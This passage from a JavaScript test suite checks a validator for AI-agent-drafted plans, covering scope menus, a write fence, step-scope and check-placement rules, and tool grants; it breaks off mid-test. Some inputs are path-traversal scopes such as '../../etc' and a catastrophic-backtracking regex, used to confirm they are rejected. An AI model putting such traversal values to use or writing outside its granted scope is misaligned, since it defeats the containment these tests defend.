test('the ReDoS red detail names the footgun (the gap must let the replan rewrite, not guess)', () => {
  const r = validatePlan(mut((p) => { p.steps[0].exit[0].pattern = '(a+)+$'; }), OPTS);
  assert.match(r.reds[0].detail ?? '', /quantifier/i);
  assert.match(r.reds[0].detail ?? '', /F49/);
});

test('check-unknown detail names the SIGNED menu (the gap must aim the replan, not taunt it)', () => {
  const r = validatePlan(mut((p) => { p.steps[1].exit[1] = { type: 'check-passes', name: 'my-clever-check' }; }), OPTS);
  assert.match(r.reds[0].detail ?? '', /clean-run/);
  assert.match(r.reds[0].detail ?? '', /form-floor/);
});

test('validation does not mutate the plan (fresh-copy comparison)', () => {
  const fresh = clone(PLAN);
  const r = validatePlan(PLAN, OPTS);
  assert.equal(r.plan, PLAN, 'reference echo is the contract');
  assert.deepEqual(r.plan, fresh);
});

test('a legacy steps[] job cannot gate a plan — plans validate only against the plan shape', () => {
  const legacy = {
    ...clone(JOB),
    steps: [{ id: 'fix', close: { type: 'predicate', cmd: 'npm test', expect: 0 }, class: 'hard' }],
  };
  delete legacy.goal; delete legacy.verdictType; delete legacy.close; delete legacy.checks; delete legacy.tools;
  const r = validatePlan(PLAN, { job: legacy });
  assert.equal(r.ok, false);
  assert.equal(`${r.reds[0].code}:${r.reds[0].path}`, 'job-invalid:job');
  assert.match(r.reds[0].detail ?? '', /plan shape/);
});

// ─── choose-don't-describe: the tree-changed scope is a MENU, not free text ───
// F60 measured 13 of 18 validator reds as ONE class: the agent writes
// {"type":"tree-changed","scope":"src/*.js"} and the grammar accepts only a
// trailing /** or /*. hamr's correction ("did agent choose from a list or
// not?") rejected both prompt-teaching and grammar-widening — the agent should
// pick from an enumerated set, so an illegal scope is INEXPRESSIBLE rather than
// rejected after a redraft call. The fence (globToPrefix) is NOT touched: this
// changes what the agent is offered, never what containment enforces.

test('legalScopes: the signed writeScope entries are ALWAYS in the menu, even with no discovered dirs', () => {
  const menu = legalScopes(['tests/**'], []);
  assert.deepEqual(menu, ['tests/**']);
});

test('legalScopes: discovered dirs become <dir>/** and are deduped against the signed entries', () => {
  const menu = legalScopes(['tests/**'], ['tests', 'tests/unit', 'tests/unit/helpers']);
  assert.deepEqual(menu, ['tests/**', 'tests/unit/**', 'tests/unit/helpers/**']);
});

test('legalScopes: a discovered dir OUTSIDE the signed fence never enters the menu', () => {
  const menu = legalScopes(['tests/**'], ['tests/unit', 'src', 'node_modules/x', '../escape']);
  assert.deepEqual(menu, ['tests/**', 'tests/unit/**'], 'only fence-contained dirs are offerable');
});

test('legalScopes: the menu is capped and prefers SHALLOW dirs (a prompt ingredient must stay bounded)', () => {
  const deep = Array.from({ length: 60 }, (_, i) => `tests/a/b/c/d${i}`);
  const shallow = ['tests/zzz'];
  const menu = legalScopes(['tests/**'], [...deep, ...shallow]);
  assert.ok(menu.length <= MAX_SCOPE_MENU, `menu was ${menu.length}`);
  assert.ok(menu.includes('tests/zzz/**'), 'a shallow dir must survive the cap ahead of 60 deep ones');
});

test('the F60 red class: a scope OFF the menu reds, and the red NAMES the menu so the redraft can choose', () => {
  const r = validatePlan(mut((p) => { p.steps[1].exit[0] = { type: 'tree-changed', scope: 'tests/*.py' }; }), OPTS);
  assert.equal(r.ok, false);
  const red = r.reds.find((x) => x.path === 'steps.1.exit.0.scope');
  assert.ok(red, `expected a scope red, got ${JSON.stringify(r.reds)}`);
  assert.equal(red.code, 'invalid-value');
  assert.match(red.detail, /tests\/\*\*/, 'the red must carry the legal values, not just say "invalid"');
});

test('a scope ON the menu passes — the agent may pick a discovered SUBDIRECTORY, not only the signed root', () => {
  const r = validatePlan(
    mut((p) => { p.steps[1].exit[0] = { type: 'tree-changed', scope: 'tests/unit/**' }; }),
    { job: JOB, scopes: legalScopes(['tests/**'], ['tests/unit']) },
  );
  assert.deepEqual(r.reds, []);
});

test('fail-CLOSED with no scopes option: the menu DERIVES from the signed writeScope — never a free-text containment fallback (F50: a silently-ignored optional param is the blind-instrument class)', () => {
  // 'tests/unit/**' is CONTAINED by the fence and would have passed the old
  // containment rule. With no dirs discovered it is not on the derived menu, so
  // it must red — otherwise omitting the option silently restores free text.
  const r = validatePlan(mut((p) => { p.steps[1].exit[0] = { type: 'tree-changed', scope: 'tests/unit/**' }; }), OPTS);
  assert.equal(r.ok, false);
  assert.ok(r.reds.some((x) => x.path === 'steps.1.exit.0.scope' && x.code === 'invalid-value'));
});

test('the fence still binds the menu: a scope on an OFFERED menu that escapes the signed fence is impossible to construct', () => {
  // legalScopes is the only producer of menus, and it filters by the fence — so
  // scope-escape via the menu is inexpressible by construction, not by a check.
  const menu = legalScopes(['tests/**'], ['../../etc', '/etc', 'tests/../src']);
  assert.deepEqual(menu, ['tests/**']);
});

test('planPrompt ENUMERATES the scope menu (choose-don\'t-describe: the agent is handed the set, never asked to guess a shape)', () => {
  const p = planPrompt(JOB, 'survey', null, 40, null, legalScopes(['tests/**'], ['tests/unit']));
  assert.match(p, /"tests\/\*\*"/);
  assert.match(p, /"tests\/unit\/\*\*"/);
  assert.doesNotMatch(p, /a scope inside/, 'the old describe-the-shape wording must be gone');
});

test('an off-menu scope splits by CAUSE: outside the fence stays scope-escape (a behaviour signal the ledger keys on), inside-but-unoffered is invalid-value', () => {
  const escaping = validatePlan(mut((p) => { p.steps[1].exit[0] = { type: 'tree-changed', scope: 'src/**' }; }), OPTS);
  const esc = escaping.reds.find((x) => x.path === 'steps.1.exit.0.scope');
  assert.equal(esc.code, 'scope-escape', 'a fence escape must never launder into the typo class');

  const unoffered = validatePlan(mut((p) => { p.steps[1].exit[0] = { type: 'tree-changed', scope: 'tests/deep/**' }; }), OPTS);
  const un = unoffered.reds.find((x) => x.path === 'steps.1.exit.0.scope');
  assert.equal(un.code, 'invalid-value');
  assert.match(un.detail, /tests\/\*\*/, 'drafting friction gets the menu; the escape gets the fence');
});

test('legalScopes: cap is a parameter so a caller can report what the cap DROPPED (no silent caps)', () => {
  const dirs = Array.from({ length: 40 }, (_, i) => `tests/d${i}`);
  const capped = legalScopes(['tests/**'], dirs);
  const uncapped = legalScopes(['tests/**'], dirs, Infinity);
  assert.equal(capped.length, MAX_SCOPE_MENU);
  assert.equal(uncapped.length, 41, 'the fence entry plus every discovered dir');
  assert.ok(uncapped.length > capped.length, 'the two counts are what makes a truncation reportable');
});

test('planPrompt: the offered scopes are a STANDALONE list, and EVERY JSON exit example stays parseable (a nested array inside a JSON string is malformed schema text)', () => {
  const p = planPrompt(JOB, 'survey', null, 40, null, legalScopes(['tests/**'], ['tests/unit']));
  // every exit example, not just tree-changed: the check-passes example carried
  // the enumerated menu INSIDE its "name" string, so the one line the drafter is
  // most likely to copy was the one malformed line among four — a nested array
  // (or any bracket list) belongs beside the example, never inside a JSON string.
  const exitLines = p.split('\n').map((l) => l.trim())
    .filter((l) => l.startsWith('{"type":"') && l.endsWith('}'));
  assert.equal(exitLines.length, EXIT_TYPES.length,
    `one example per exit type — got ${exitLines.length} for ${EXIT_TYPES.length} types`);
  for (const line of exitLines) {
    assert.doesNotThrow(() => JSON.parse(line), `exit example must be valid JSON, got: ${line}`);
  }
  assert.match(p, /Offered "scope" values for tree-changed/);
  assert.match(p, /^ {2}"tests\/unit\/\*\*"$/m, 'each offered value on its own line, quoted, copyable');
});

test('planPrompt states every bound and rule the validator ENFORCES — an unstated red is drafting friction the agent cannot see', () => {
  // The prompt is the whole contract the agent drafts against: a bound the
  // validator reds but the prompt never mentions is a round burnt on a rule the
  // drafter had no way to know. Both `step-scope-escape` reds (a target outside
  // its own step's narrowed scope; a tree-changed scope disjoint from it) were
  // enforced and never stated.
  const scopes = legalScopes(['tests/**'], ['tests/unit']);
  const p = planPrompt(JOB, 'survey', null, 40, null, scopes, undefined);
  // `attempts` is the mirror rule: a field the prompt must NOT offer, because the
  // step ladder governs iterations and the field bounds nothing (validatePlan
  // still tolerates it for stored bridge plans — offered and accepted are
  // different questions, and only "offered" is the drafter's contract).
  assert.doesNotMatch(p, /"attempts"/, 'the drafter is never offered a knob that decides nothing');
  assert.match(p, /"scope"/, 'the step scope field is offered');
  // stated as rules, in the prompt's own voice — matched on the load-bearing
  // words rather than the sentence, so a rewording does not break the pin
  const scopeRules = p.slice(p.indexOf('"scope" (optional)'), p.indexOf('- "exit"'));
  assert.match(scopeRules, /"target"[\s\S]*?inside/i, 'the target-inside-its-own-scope rule is stated');
  assert.match(scopeRules, /"tree-changed"[\s\S]*?disjoint/i, 'the tree-changed-not-disjoint rule is stated');
});

test('maxWallMs is ARBITER territory: smuggled into a plan or a step it reds unknown-field (the agent cannot author, tighten, or widen the time cap in v1 — it has no time field at all)', () => {
  const top = validatePlan({ ...clone(PLAN), maxWallMs: 60_000 }, OPTS);
  assert.ok(top.reds.some((x) => x.code === 'unknown-field' && x.path === 'maxWallMs'));
  const step = validatePlan(mut((p) => { p.steps[0].maxWallMs = 60_000; }), OPTS);
  assert.ok(step.reds.some((x) => x.code === 'unknown-field' && x.path === 'steps.0.maxWallMs'));
});

// ---- P: the widened step vocabulary (design record 2026-07-28) — all tighten-only ----

test('P: model from the closed tier menu is accepted; an off-menu value is inexpressible — haiku is OFF the menu (2026-08-06 attribution probe)', () => {
  assert.deepEqual(validatePlan(mut((p) => { p.steps[0].model = 'sonnet'; }), OPTS).reds, []);
  // haiku sits beside opus now: the tier is dropped from the AGENT-selectable menu
  // while the archive read is attributed (src/plan.js STEP_MODELS). `--model haiku`
  // stays the operator's own probe knob — this menu governs only what a PLAN may say.
  for (const off of ['haiku', 'opus']) {
    const r = validatePlan(mut((p) => { p.steps[0].model = off; }), OPTS);
    assert.equal(r.reds.length, 1, `"${off}" is off-menu — got ${JSON.stringify(r.reds)}`);
    assert.equal(r.reds[0].code, 'invalid-value');
    assert.equal(r.reds[0].path, 'steps.0.model');
    assert.match(r.reds[0].detail ?? '', /menu: sonnet(?![|\w])/, 'the menu is handed over, not described');
  }
});

test('P: attempts is TOLERATED-INERT — any positive integer validates (stored bridge plans carry it), garbage still reds', () => {
  // It used to tighten a fixed per-step attempt count. That count is gone (the
  // step ladder governs iterations by progress), so the field bounds nothing and
  // the prompt no longer offers it. It is NOT rejected, and that half is
  // load-bearing: the frozen bridge registry's stored plans carry `attempts`, and
  // a validator that redded them would refuse every recipe minted before today
  // and ruin a frozen contrast experiment.
  assert.deepEqual(validatePlan(mut((p) => { p.steps[1].attempts = 2; }), { job: JOB }).reds, []);
  assert.deepEqual(validatePlan(mut((p) => { p.steps[1].attempts = 9; }), { job: JOB }).reds, [],
    'no upper bound survives the cap it named — a plan stored under one runner\'s number must not be invalid under another\'s');
  // the SHAPE is still checked: a known field holding garbage stays a named red
  for (const bad of [0, -1, 1.5, 'two', null]) {
    const r = validatePlan(mut((p) => { p.steps[1].attempts = bad; }), { job: JOB });
    assert.equal(r.reds.length, 1, `attempts: ${JSON.stringify(bad)} must red`);
    assert.equal(r.reds[0].code, 'bounds');
  }
});

test('P: a per-step scope narrows the fence from the SAME menu tree-changed uses', () => {
  assert.deepEqual(validatePlan(mut((p) => { p.steps[1].scope = 'tests/**'; }), OPTS).reds, []);
  const r = validatePlan(mut((p) => { p.steps[1].scope = 'src/**'; }), OPTS);
  assert.equal(r.reds.length, 1, JSON.stringify(r.reds));
  assert.match(r.reds[0].detail ?? '', /menu/, 'choose-dont-describe: the legal scopes are enumerated');
});

test('P: the three new fields are optional — an existing six-field plan is untouched', () => {
  assert.deepEqual(validatePlan(PLAN, OPTS).reds, []);
});

// ---- W3: a step's own `scope` is the fence the RUNNER builds for it ----
// planrun's mkWorker gates a scoped step with `[resolve(workdir, globToPrefix(scope))]`,
// not the signed fence. So a TARGET that is in-fence but outside the step's OWN scope
// is a write the gate denies on every attempt: the step burns its whole attempt budget
// on refusals and no red is ever raised. Both halves were individually legal, so
// nothing caught the incoherent PAIR.
//
// The rule binds the TARGET (a write by the worker) and, in one narrow form, the
// `tree-changed` scope — never the artifact paths. Exits are OBSERVATIONS the shell
// makes, not writes, and src/exits.js is the only authority on what they impose:
//   - `tree-changed` passes iff ANY file under its own scope changed, so a scope that
//     CONTAINS the step's scope contains the step's writable ground and fires exactly
//     when the narrow one does (measured: step tests/unit/**, exit tests/**, one write
//     to tests/unit/a.py → pass:true, same as the narrow scope). Only a DISJOINT scope
//     is unsatisfiable — it can pass only if ground this step's gate refuses changed.
//   - `artifact-written`/`json-valid` only read+parse the named file; they never ask
//     who wrote it (measured: a path outside the step's scope naming a PRIOR step's
//     artifact → pass:true). Nothing about the step's gate is imposed, so no
//     step-scope red belongs on those arms at all.
// The narrowed scope NEVER replaces the fence check — fence first, scope second —
// so a caller-supplied menu can only tighten what is accepted, never widen it.

/** the two-level menu these cases need: the signed fence plus a real subdirectory */
const NESTED = { job: JOB, scopes: ['tests/**', 'tests/unit/**'] };
/** two SIBLING subdirectories — the only shape that can be disjoint inside one fence */
const BRANCHED = { job: JOB, scopes: ['tests/**', 'tests/e2e/**', 'tests/unit/**'] };

test('W3: a scoped step whose target sits outside its OWN scope reds step-scope-escape (in-fence, gate-denied — the class nothing caught)', () => {
  const r = validatePlan(mut((p) => {
    p.steps[1].scope = 'tests/unit/**';
    p.steps[1].exit[0] = { type: 'tree-changed', scope: 'tests/unit/**' };
    // target stays tests/test_orchestrator.py: inside the signed fence, outside the step's scope
  }), NESTED);
  assert.equal(r.reds.length, 1, `one defect, one red, got ${JSON.stringify(r.reds)}`);
  assert.equal(`${r.reds[0].code}:${r.reds[0].path}`, 'step-scope-escape:steps.1.target');
  assert.match(r.reds[0].detail ?? '', /tests\/unit\/\*\*/, 'the gap names the step\'s OWN narrowed scope, not the signed fence');
});

test('W3: an artifact-written path outside the step\'s own scope is GREEN — the evaluator reads the file, it never asks who wrote it', () => {
  // measured against src/exits.js: `artifact-written`/`json-valid` readFile+parse and
  // nothing else, so a path naming a PRIOR step's artifact (v1 is strictly sequential —
  // the natural shape) evaluates pass:true. A red here would claim a constraint the
  // evaluator does not impose, and tax a legal draft.
  const r = validatePlan(mut((p) => {
    p.steps[0].scope = 'tests/unit/**';
    p.steps[0].target = 'tests/unit/notes.md';
    p.steps[0].exit = [
      { type: 'artifact-written', path: 'tests/notes.md', pattern: 'def ' },
      { type: 'tree-changed', scope: 'tests/unit/**' },
    ];
  }), NESTED);
  assert.deepEqual(r.reds, []);
});

test('W3: a json-valid path outside the step\'s own scope is GREEN too (same arm, same evaluator semantics)', () => {
  const r = validatePlan(mut((p) => {
    p.steps[0].scope = 'tests/unit/**';
    p.steps[0].target = 'tests/unit/notes.md';
    p.steps[0].exit = [
      { type: 'json-valid', path: 'tests/report.json' },
      { type: 'tree-changed', scope: 'tests/unit/**' },
    ];
  }), NESTED);
  assert.deepEqual(r.reds, []);
});

test('W3: a tree-changed scope WIDER than the step\'s own scope is GREEN — a superset contains the step\'s ground and fires exactly when the narrow scope does', () => {
  // measured against src/exits.js snapshotScope/evalExits: step scope tests/unit/**,
  // exit scope tests/**, one write to tests/unit/a.py → pass:true, identical to the
  // narrow scope. The menu is shallowest-first and the prompt says copy one value, so
  // the widest scope is the most likely draft — redding it taxes the natural plan
  // (the F60 class `legalScopes` exists to eliminate).
  const r = validatePlan(mut((p) => {
    p.steps[1].scope = 'tests/unit/**';
    p.steps[1].target = 'tests/unit/test_orchestrator.py';
    p.steps[1].exit[0] = { type: 'tree-changed', scope: 'tests/**' };
  }), NESTED);
  assert.deepEqual(r.reds, []);
  assert.equal(r.ok, true);
});

test('W3: a DISJOINT tree-changed scope still reds step-scope-escape — no write this step is allowed to make could ever satisfy it', () => {
  // measured: step writes only under tests/unit/**, exit watches tests/e2e/** whose
  // pre-step snapshot already holds every prior step's bytes → 0 files changed, pass:false
  // on every attempt. Unsatisfiable by construction, which is what W3 closes.
  const r = validatePlan(mut((p) => {
    p.steps[1].scope = 'tests/unit/**';
    p.steps[1].target = 'tests/unit/test_orchestrator.py';
    p.steps[1].exit[0] = { type: 'tree-changed', scope: 'tests/e2e/**' };
  }), BRANCHED);
  assert.equal(r.reds.length, 1, `one defect, one red, got ${JSON.stringify(r.reds)}`);
  assert.equal(`${r.reds[0].code}:${r.reds[0].path}`, 'step-scope-escape:steps.1.exit.0.scope');
  assert.match(r.reds[0].detail ?? '', /tests\/unit\/\*\*/, 'the gap names the step\'s OWN narrowed scope so the redraft can aim');
});

test('W3: a NARROWER tree-changed scope than the step\'s own scope is GREEN (the step can write there; the exit just watches less)', () => {
  const r = validatePlan(mut((p) => {
    p.steps[1].scope = 'tests/**';
    p.steps[1].target = 'tests/unit/test_orchestrator.py';
    p.steps[1].exit[0] = { type: 'tree-changed', scope: 'tests/unit/**' };
  }), NESTED);
  assert.deepEqual(r.reds, []);
});

test('W3: a scoped step whose target and exits all sit INSIDE its own scope stays green (the rule does not overreach)', () => {
  const r = validatePlan(mut((p) => {
    p.steps[1].scope = 'tests/unit/**';
    p.steps[1].target = 'tests/unit/test_orchestrator.py';
    p.steps[1].exit[0] = { type: 'tree-changed', scope: 'tests/unit/**' };
  }), NESTED);
  assert.deepEqual(r.reds, []);
  assert.equal(r.ok, true);
});

test('W3: the fence still binds FIRST — a scoped step reaching outside the SIGNED fence keeps the scope-escape class the ledger reads', () => {
  const r = validatePlan(mut((p) => {
    p.steps[1].scope = 'tests/unit/**';
    p.steps[1].target = 'src/hack.py';
    p.steps[1].exit[0] = { type: 'tree-changed', scope: 'tests/unit/**' };
  }), NESTED);
  assert.equal(r.reds.length, 1, `one defect, one red, got ${JSON.stringify(r.reds)}`);
  assert.equal(`${r.reds[0].code}:${r.reds[0].path}`, 'scope-escape:steps.1.target',
    'a fence escape must never launder into the narrower step-scope class');
});

test('W3: an UNSCOPED step is judged by the signed fence exactly as before (regression control)', () => {
  // no `scope` field: every target/path/scope in the POC plan spans the whole
  // fence and must stay green, and an out-of-fence target must still be scope-escape
  assert.deepEqual(validatePlan(PLAN, NESTED).reds, []);
  const r = validatePlan(mut((p) => { p.steps[1].target = 'src/hack.py'; }), NESTED);
  assert.equal(r.reds.length, 1, JSON.stringify(r.reds));
  assert.equal(`${r.reds[0].code}:${r.reds[0].path}`, 'scope-escape:steps.1.target');
  assert.ok(!r.reds.some((x) => x.code === 'step-scope-escape'), 'no step scope, no step-scope red');
});

test('W3: an OFF-MENU step scope is one defect — the illegal scope reds, the narrowed containment does not pile on', () => {
  const r = validatePlan(mut((p) => { p.steps[1].scope = 'tests/deep/**'; }), NESTED);
  assert.equal(r.reds.length, 1, `one defect, one red, got ${JSON.stringify(r.reds)}`);
  assert.equal(`${r.reds[0].code}:${r.reds[0].path}`, 'invalid-value:steps.1.scope');
});

// ---- W4: ONE close staging feeds the prompt, the validator and the runner ----

/** the legacy object-form predicate close — still validateJob-green, and the only
 * shape whose staging used to differ between the three consumers */
const OBJ_JOB = { ...clone(JOB), close: { type: 'predicate', cmd: 'python grade.py', expect: 0, gapKeep: '^FAILED' } };

test('W4: an object-form predicate close is validateJob-green (the anchor these cases rest on)', () => {
  assert.deepEqual(validateJob(OBJ_JOB).reds, []);
});

test('W4: the validator derives the SAME single staged stage the runner runs — check-passes("close") validates green', () => {
  const r = validatePlan(mut((p) => { p.steps[1].exit[1] = { type: 'check-passes', name: 'close' }; }), { job: OBJ_JOB });
  assert.deepEqual(r.reds, [], 'the runner stages [{name:"close"}] and executes it at preflight — the validator must offer the same one');
});

test('W4: planPrompt offers that same stage — the drafter is never handed an empty menu for a close the runner stages', () => {
  const p = planPrompt(OBJ_JOB, 'survey', null, 40, null, legalScopes(['tests/**']));
  assert.match(p, /one of \["close"\]/, 'the prompt enumerates the derived stage');
});

test('W4: prompt and validator agree on the object-form close — anything the prompt offers, the validator accepts', () => {
  const offered = /one of (\[.*?\])/.exec(planPrompt(OBJ_JOB, 'survey', null, 40, null, legalScopes(['tests/**'])))?.[1];
  const names = JSON.parse(offered ?? '[]');
  // an EMPTY offer would make every assertion below vacuous — the loop must run
  assert.ok(names.length > 0, 'the prompt must offer at least the staged close stage');
  for (const name of names) {
    const r = validatePlan(mut((p) => { p.steps[1].exit[1] = { type: 'check-passes', name }; }), { job: OBJ_JOB });
    assert.deepEqual(r.reds, [], `the prompt offered "${name}" — the validator must accept it`);
  }
});

test('W4: an ARRAY close is untouched by the staging hoist (regression control)', () => {
  assert.deepEqual(validatePlan(PLAN, OPTS).reds, []);
  const r = validatePlan(mut((p) => { p.steps[1].exit[1] = { type: 'check-passes', name: 'close' }; }), OPTS);
  assert.equal(`${r.reds[0].code}:${r.reds[0].path}`, 'check-unknown:steps.1.exit.1',
    '"close" is not a stage of THIS close — the staged name exists only for the object form');
  assert.match(planPrompt(JOB, 'survey', null, 40, null, legalScopes(['tests/**'])), /\["clean-run","form-floor","verdict"\]/);
});

// ─── the shape-lottery gate rules (2026-08-04, hamr "go") ───
// The $0 sweep over every archived spine: per-file decomposition with the
// whole-goal check on an EARLY step has 0 honest greens ever (bareagent ×3,
// baremobile, ms4l5p6w, ms57zr7c all died there); the RLM shape — one wide
// closing step carrying the real check, iterating — greens 7/7 whenever
// rolled. Both rules are MECHANICAL (keyed on recorded preflight verdicts and
// the predecessor plan's exits), never an LLM judgment of "is this job
// small": the losing shape becomes inexpressible at the gate, the drafter is
// never asked to assess decomposition.

test('Rule A-v2 green: a seed-red check on the FINAL write step validates green (the RLM closing step)', () => {
  // PLAN's own shape: steps.1 is the last write-granted step and carries
  // check-passes(clean-run) — the 7/7 winning shape must stay legal untouched.
  const r = validatePlan(PLAN, { job: JOB, seedRed: ['clean-run'] });
  assert.deepEqual(r.reds, []);
});

test('Rule A-v2 red: a seed-red check on an EARLIER write step is check-placement (the bareagent-u death shape)', () => {
  // u-msdpuaej/u-msdsmkid: step 1 of 2 carried the whole-goal check while its
  // action scoped to a slice — unsatisfiable without crossing the step's own
  // boundary, 0 honest greens in the whole archive. The F17 pairing is paid
  // (tree-changed conjunct present) so the ONLY defect is the placement.
  const r = validatePlan(mut((p) => {
    p.steps[0].exit = [{ type: 'tree-changed', scope: 'tests/**' }, { type: 'check-passes', name: 'clean-run' }];
  }), { job: JOB, seedRed: ['clean-run'] });
  assert.equal(r.ok, false);
  assert.equal(r.reds.length, 1, `exactly one red, got ${JSON.stringify(r.reds)}`);
  assert.equal(`${r.reds[0].code}:${r.reds[0].path}`, 'check-placement:steps.0.exit.1');
  assert.match(r.reds[0].detail ?? '', /final write step/i);
});

test('Rule A-v2 is keyed on the RECORDED verdicts, never a default: seedRed omitted leaves the same plan green (resume/reuse callers byte-identical)', () => {
  const early = mut((p) => {
    p.steps[0].exit = [{ type: 'tree-changed', scope: 'tests/**' }, { type: 'check-passes', name: 'clean-run' }];
  });
  assert.deepEqual(validatePlan(early, OPTS).reds, []);
});

test('Rule A-v2 constrains ONLY seed-red names: a green-at-seed check stays free mid-plan (the 20 TESTGEN mid-plan greens)', () => {
  const early = mut((p) => {
    p.steps[0].exit = [{ type: 'tree-changed', scope: 'tests/**' }, { type: 'check-passes', name: 'clean-run' }];
  });
  assert.deepEqual(validatePlan(early, { job: JOB, seedRed: ['form-floor'] }).reds, []);
});

test('Rule A-v2: the final WRITE step need not be the final step — a trailing read-only step does not move the anchor', () => {
  const r = validatePlan(mut((p) => {
    p.steps[0].exit = [{ type: 'tree-changed', scope: 'tests/**' }, { type: 'check-passes', name: 'clean-run' }];
    p.steps[1] = {
      id: 'read-back', action: 'Read the suite and confirm the notes file lists every covered function.',
      tools: ['read', 'get'], rounds: 4,
      exit: [{ type: 'artifact-written', path: 'tests/notes.md' }],
    };
  }), { job: JOB, seedRed: ['clean-run'] });
  assert.deepEqual(r.reds, [], 'steps.0 IS the final write step here — the seed-red check on it is the legal RLM anchor');
});

test('Rule A-v2 does not double-charge a mailbox: a seed-red check on a READ-ONLY step raises the mailbox red alone (one defect, one red)', () => {
  const r = validatePlan(mut((p) => {
    p.steps[1].tools = ['read', 'get'];
    delete p.steps[1].target;
    p.steps[1].exit = [{ type: 'check-passes', name: 'clean-run' }];
  }), { job: JOB, seedRed: ['clean-run'] });
  assert.equal(r.ok, false);
  assert.equal(r.reds.length, 1, `exactly one red, got ${JSON.stringify(r.reds)}`);
  assert.equal(r.reds[0].code, 'exit-illegal');
});

test('Rule B red: a redraft that DROPS a predecessor plan\'s check-passes is check-shed (u-msdsmkid: exits became form-only and "greened" unearned)', () => {
  const shed = mut((p) => { p.steps[1].exit = [{ type: 'tree-changed', scope: 'tests/**' }]; });
  const r = validatePlan(shed, { job: JOB, priorChecks: ['clean-run'] });
  assert.equal(r.ok, false);
  assert.equal(r.reds.length, 1, `exactly one red, got ${JSON.stringify(r.reds)}`);
  assert.equal(`${r.reds[0].code}:${r.reds[0].path}`, 'check-shed:steps');
  assert.match(r.reds[0].detail ?? '', /clean-run/);
  // and the same shed plan with NO priorChecks stays green — the rule reads the
  // predecessor's exits, never a default
  assert.deepEqual(validatePlan(shed, OPTS).reds, []);
});

test('Rule B green: the redraft that KEEPS every inherited check validates green', () => {
  assert.deepEqual(validatePlan(PLAN, { job: JOB, priorChecks: ['clean-run'] }).reds, []);
});

test('Rule B names ONLY the dropped check(s) — a kept one is never charged', () => {
  // predecessor carried two checks; the redraft keeps clean-run, drops form-floor
  const r = validatePlan(PLAN, { job: JOB, priorChecks: ['clean-run', 'form-floor'] });
  assert.equal(r.ok, false);
  assert.equal(r.reds.length, 1, `exactly one red, got ${JSON.stringify(r.reds)}`);
  assert.equal(r.reds[0].code, 'check-shed');
  assert.match(r.reds[0].detail ?? '', /form-floor/);
  assert.doesNotMatch(r.reds[0].detail ?? '', /"clean-run"/);
});

test('planPrompt states Rule A-v2 when seed-red checks exist: the failing check is the goal — final write step only, framed wide', () => {
  const p = planPrompt(JOB, 'survey', null, 40, null, legalScopes(['tests/**']), undefined, null, { seedRed: ['clean-run'] });
  assert.match(p, /"clean-run"/);
  assert.match(p, /FINAL write step/i);
  assert.match(p, /free to edit any file it reports/i);
});

test('planPrompt states Rule B on a replan: every inherited check must be kept', () => {
  const p = planPrompt(JOB, 'survey', null, 40, null, legalScopes(['tests/**']), undefined, null, { priorChecks: ['clean-run'] });
  assert.match(p, /previous plan carried/i);
  assert.match(p, /"clean-run"/);
  assert.match(p, /drops? .*(check|one of them).* (is|are) rejected|dropping (a|any) check.* rejected/i);
});

test('planPrompt without checkFacts renders byte-identical to the pre-rules prompt (additive, never surgery)', () => {
  const scopes = legalScopes(['tests/**']);
  assert.equal(
    planPrompt(JOB, 'survey', null, 40, null, scopes, undefined, null, {}),
    planPrompt(JOB, 'survey', null, 40, null, scopes, undefined, null),
  );
});

// ─── G1: the read shim's admission rule (flag-gated, default inactive) ───
// The shim caps a read at 24 KB and hands back a steer. A worker capped with no
// retrieval verb has no way to reach the rest of the file — that is BA-17
// read-blinding, this time on purpose. So a step that grants `read` under the
// shim must also grant `recall` and `get`. Keyed on a FACT the caller passes
// (`readShim`), inactive when omitted: with the shim off the validator must
// render byte-identically, or the frozen A0 baseline arm quietly becomes a
// treatment arm and the whole contrast is unreadable.

test('G1: a step granting read without recall+get reds read-blind when the shim is ON', () => {
  const r = validatePlan(mut((p) => { p.steps[0].tools = ['read', 'write']; }), { ...OPTS, readShim: true });
  assert.equal(r.ok, false);
  assert.equal(r.reds.length, 1, `exactly one red, got ${JSON.stringify(r.reds)}`);
  assert.equal(`${r.reds[0].code}:${r.reds[0].path}`, 'read-blind:steps.0.tools');
  assert.match(r.reds[0].detail ?? '', /recall/);
  assert.match(r.reds[0].detail ?? '', /get/);
});

test('G1: a PARTIAL retrieval grant is still blind — one of the pair is not the pair', () => {
  for (const tools of [['read', 'recall', 'write'], ['read', 'get', 'write']]) {
    const r = validatePlan(mut((p) => { p.steps[0].tools = tools; }), { ...OPTS, readShim: true });
    assert.equal(r.ok, false, `${JSON.stringify(tools)} must red`);
    assert.equal(r.reds.filter((x) => x.code === 'read-blind').length, 1, `got ${JSON.stringify(r.reds)}`);
  }
});

test('G1 does NOT fire on a step that never granted read — the cap only binds the verb it wraps', () => {
  const r = validatePlan(mut((p) => { p.steps[0].tools = ['recall', 'get', 'write']; }), { ...OPTS, readShim: true });
  assert.deepEqual(r.reds, []);
});

test('G1 is INERT with the flag off: the same plan validates byte-identically to today (the A0 guarantee)', () => {
  const blind = mut((p) => { p.steps[0].tools = ['read', 'write']; });
  const off = validatePlan(blind, OPTS);
  assert.deepEqual(off.reds, [], 'the shim being off means the rule does not exist');
  assert.equal(off.ok, true);
  // and the ON arm on the SAME input reds — the check is proven divergeable,
  // not a rule that would pass whatever it was handed
  assert.equal(validatePlan(blind, { ...OPTS, readShim: true }).ok, false);
});

test('G1 with an UNPARSEABLE grant stays silent: one defect, one red (the mailbox precedent)', () => {
  const r = validatePlan(mut((p) => { delete p.steps[0].tools; }), { ...OPTS, readShim: true });
  assert.equal(r.reds.length, 1, `exactly one red, got ${JSON.stringify(r.reds)}`);
  assert.equal(`${r.reds[0].code}:${r.reds[0].path}`, 'missing-required:steps.0.tools');
});

test('G1 fires under the CAP arm and is silent under the DIFF arm — the rule belongs to the cap, not to the shim', () => {
  // A2 caps nothing, so there is nothing for a worker to be blind to. Firing G1
  // there would narrow A2's admissible plan space on top of the one lever it is
  // meant to isolate, and the A2-vs-A1 contrast would be reading two changes.
  const blind = mut((p) => { p.steps[0].tools = ['read', 'write']; });
  const cap = validatePlan(blind, { ...OPTS, readShim: 'cap' });
  assert.equal(cap.ok, false, "'cap' carries G1");
  assert.equal(`${cap.reds[0].code}:${cap.reds[0].path}`, 'read-blind:steps.0.tools');

  const diff = validatePlan(blind, { ...OPTS, readShim: 'diff' });
  assert.deepEqual(diff.reds, [], "'diff' does not — the same plan, admissible");
  assert.equal(diff.ok, true);

  // and the two capping arms agree with each other, so A1 and A3 admit the same plans
